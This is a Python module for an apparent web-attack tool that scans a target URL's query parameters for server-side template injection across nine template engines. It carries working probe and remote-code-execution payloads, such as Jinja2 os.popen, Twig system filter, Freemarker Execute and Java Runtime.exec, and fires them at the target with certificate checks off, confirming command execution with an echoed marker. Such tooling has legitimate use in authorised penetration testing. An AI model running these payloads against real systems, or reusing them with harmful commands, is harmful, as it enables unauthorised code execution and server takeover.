import asyncio
import json
import random
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import httpx
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn

console = Console()

RCE_MARKER = "prth0ssti"

_A = random.randint(1000, 9999)
_B = random.randint(1000, 9999)
_PRODUCT = str(_A * _B)

ENGINES: list[dict] = [
    {"engine": "Jinja2",     "probe": f"{{{{{_A}*{_B}}}}}",            "expect": _PRODUCT,
     "confirm": f"{{{{config}}}}", "confirm_expect": "Config",
     "rce": "{{cycler.__init__.__globals__.os.popen('echo " + RCE_MARKER + "').read()}}"},
    {"engine": "Jinja2",     "probe": "{{7*'7'}}",                     "expect": "7777777",
     "confirm": "{{config}}", "confirm_expect": "Config",
     "rce": "{{cycler.__init__.__globals__.os.popen('echo " + RCE_MARKER + "').read()}}"},
    {"engine": "Twig",       "probe": f"{{{{{_A}*{_B}}}}}",            "expect": _PRODUCT,
     "confirm": "{{_self}}", "confirm_expect": "Twig",
     "rce": "{{['echo " + RCE_MARKER + "']|filter('system')}}"},
    {"engine": "Twig",       "probe": "{{7*'7'}}",                     "expect": "49",
     "confirm": "{{_self.env}}", "confirm_expect": "Twig",
     "rce": "{{['echo " + RCE_MARKER + "']|filter('system')}}"},
    {"engine": "Freemarker", "probe": f"${{{_A}*{_B}}}",               "expect": _PRODUCT,
     "confirm": "<#assign x=1>${x}", "confirm_expect": "1",
     "rce": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"echo " + RCE_MARKER + "\")}"},
    {"engine": "Velocity",   "probe": f"#set($x={_A}*{_B})$x",         "expect": _PRODUCT,
     "confirm": "#set($x=1)$x", "confirm_expect": "1",
     "rce": "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"echo " + RCE_MARKER + "\")"},
    {"engine": "ERB",        "probe": f"<%= {_A}*{_B} %>",             "expect": _PRODUCT,
     "confirm": "<%= 1+1 %>", "confirm_expect": "2",
     "rce": "<%= `echo " + RCE_MARKER + "` %>"},
    {"engine": "Smarty",     "probe": f"{{{_A}*{_B}}}",                "expect": _PRODUCT,
     "confirm": "{$smarty.version}", "confirm_expect": "Smarty",
     "rce": "{system('echo " + RCE_MARKER + "')}"},
    {"engine": "Smarty",     "probe": "{$smarty.version}",             "expect": "Smarty",
     "confirm": "{$smarty.version}", "confirm_expect": "Smarty",
     "rce": "{php}echo '" + RCE_MARKER + "';{/php}"},
    {"engine": "Mako",       "probe": f"${{{_A}*{_B}}}",               "expect": _PRODUCT,
     "confirm": "${1+1}", "confirm_expect": "2",
     "rce": "${self.module.cache.util.os.popen('echo " + RCE_MARKER + "').read()}"},
    {"engine": "Pebble",     "probe": f"{{{{{_A}*{_B}}}}}",            "expect": _PRODUCT,
     "confirm": "{{1+1}}", "confirm_expect": "2",
     "rce": "{% set cmd='echo " + RCE_MARKER + "' %}"},
    {"engine": "Thymeleaf",  "probe": f"[[${{{_A}*{_B}}}]]",          "expect": _PRODUCT,
     "confirm": "[[${1+1}]]", "confirm_expect": "2",
     "rce": "[[${T(java.lang.Runtime).getRuntime().exec('echo " + RCE_MARKER + "')}]]"},
]

SEVERITY_COLOR = {
    "critical": "bold red",
    "high":     "red",
    "medium":   "yellow",
    "low":      "dim",
    "info":     "cyan",
}


@dataclass
class SSTIFinding:
    url:        str
    param:      str
    engine:     str
    payload:    str
    rce:        bool
    status:     int          = 0
    evidence:   str          = ""
    severity:   str          = "critical"

    def to_dict(self) -> dict:
        return self.__dict__.copy()


@dataclass
class SSTIReport:
    target:      str
    started_at:  str                  = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    finished_at: Optional[str]       = None
    params:      list[str]           = field(default_factory=list)
    findings:    list[SSTIFinding]   = field(default_factory=list)
    errors:      list[str]           = field(default_factory=list)

    @property
    def critical(self) -> list[SSTIFinding]:
        return [f for f in self.findings if f.severity == "critical"]

    def to_dict(self) -> dict:
        d = self.__dict__.copy()
        d["findings"] = [f.to_dict() for f in self.findings]
        return d


def _set_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))


def _candidate_params(url: str, extra: Optional[list[str]]) -> list[str]:
    params = list(parse_qs(urlparse(url).query).keys())
    if extra:
        for p in extra:
            if p not in params:
                params.append(p)
    if not params:
        params = ["q", "name", "search"]
    return params


async def _test_param(client, url, param, sem) -> list[SSTIFinding]:
    findings = []
    seen_engines = set()
    async with sem:
        for eng in ENGINES:
            if eng["engine"] in seen_engines:
                continue
            try:
                r = await client.get(_set_param(url, param, eng["probe"]), timeout=12)
            except Exception:
                continue

            if eng["expect"] not in r.text or eng["probe"] in r.text:
                continue

            rce_confirmed = False
            rce_evidence = ""
            try:
                rr = await client.get(_set_param(url, param, eng["rce"]), timeout=15)
                if RCE_MARKER in rr.text and eng["rce"] not in rr.text:
                    rce_confirmed = True
                    rce_evidence = f"command output '{RCE_MARKER}' returned"
            except Exception:
                pass

            seen_engines.add(eng["engine"])
            f = SSTIFinding(
                url=url, param=param, engine=eng["engine"], payload=eng["probe"],
                rce=rce_confirmed, status=r.status_code,
                evidence=(rce_evidence or f"expression evaluated to {eng['expect']}"),
                severity="critical",
            )
            findings.append(f)
            _print_finding(f)
    return findings


def _print_finding(f: SSTIFinding):
    color = SEVERITY_COLOR.get(f.severity, "white")
    tag = "RCE CONFIRMED" if f.rce else "template eval"
    console.print(
        f"  [{color}][{f.severity.upper()}][/{color}] "
        f"[bold white]{f.param}[/bold white] → "
        f"[yellow]{f.engine}[/yellow] [magenta]({tag})[/magenta]  "
        f"[dim]{f.evidence[:50]}[/dim]"
    )


def _display(report: SSTIReport):
    console.print()
    console.print(Panel(
        f"[bold white]{report.target}[/bold white]  "
        f"[dim]params:[/dim] {len(report.params)}  "
        f"[dim]findings:[/dim] [yellow]{len(report.findings)}[/yellow]  "
        f"[dim]critical:[/dim] [red]{len(report.critical)}[/red]",
        title="[bold red]SSTI Scan — Summary[/bold red]",
        border_style="red",
    ))

    if not report.findings:
        console.print("[dim]    No SSTI found.[/dim]\n")
        return

    table = Table(show_header=True, header_style="bold red", border_style="dim")
    table.add_column("Severity",  width=10)
    table.add_column("Param",     style="bold white", width=16)
    table.add_column("Engine",    style="cyan", width=14)
    table.add_column("RCE",       style="magenta", width=6)
    table.add_column("Evidence",  style="yellow", min_width=28)

    for f in report.findings:
        color = SEVERITY_COLOR.get(f.severity, "white")
        table.add_row(
            f"[{color}]{f.severity}[/{color}]",
            f.param, f.engine, "yes" if f.rce else "no", f.evidence[:45],
        )

    console.print(table)
    console.print()


async def _ssti_async(target, extra_params, concurrency, proxy) -> SSTIReport:
    report = SSTIReport(target=target)
    params = _candidate_params(target, extra_params)
    report.params = params
    sem = asyncio.Semaphore(concurrency)

    async with httpx.AsyncClient(
        verify=False,
        follow_redirects=True,
        proxy=proxy,
        headers={"User-Agent": "Mozilla/5.0 (compatible; Prothos/1.0)"},
    ) as client:

        with Progress(
            SpinnerColumn(style="red"),
            TextColumn("[bold white]{task.description}"),
            BarColumn(bar_width=35, style="red", complete_style="green"),
            TextColumn("[green]{task.completed}[/green]/[white]{task.total}[/white]"),
            TimeElapsedColumn(),
            console=console,
            transient=True,
        ) as progress:
            task_id = progress.add_task("Scanning SSTI...", total=len(params))
            tasks = [_test_param(client, target, p, sem) for p in params]
            for coro in asyncio.as_completed(tasks):
                report.findings.extend(await coro)
                progress.advance(task_id, 1)

    report.finished_at = datetime.now(timezone.utc).isoformat()
    return report


def run_ssti_scan(
    target:        str,
    params:        Optional[list[str]] = None,
    concurrency:   int                 = 8,
    proxy:         Optional[str]       = None,
    save_json:     Optional[str]       = None,
) -> SSTIReport:

    console.print(f"\n[bold red][*][/bold red] SSTI Scan → [bold white]{target}[/bold white]")
    detected = _candidate_params(target, params)
    console.print(f"[dim]    Params: {', '.join(detected)}  "
                  f"Engines: Jinja2, Twig, Freemarker, Velocity, ERB, Smarty, Mako, Thymeleaf[/dim]")

    report = asyncio.run(_ssti_async(
        target=target,
        extra_params=params,
        concurrency=concurrency,
        proxy=proxy,
    ))

    _display(report)

    if save_json:
        try:
            with open(save_json, "w") as f:
                json.dump(report.to_dict(), f, indent=2, default=str)
            console.print(f"[dim][+] Saved to {save_json}[/dim]")
        except OSError as e:
            console.print(f"[red][!] Failed to save: {e}[/red]")

    return report
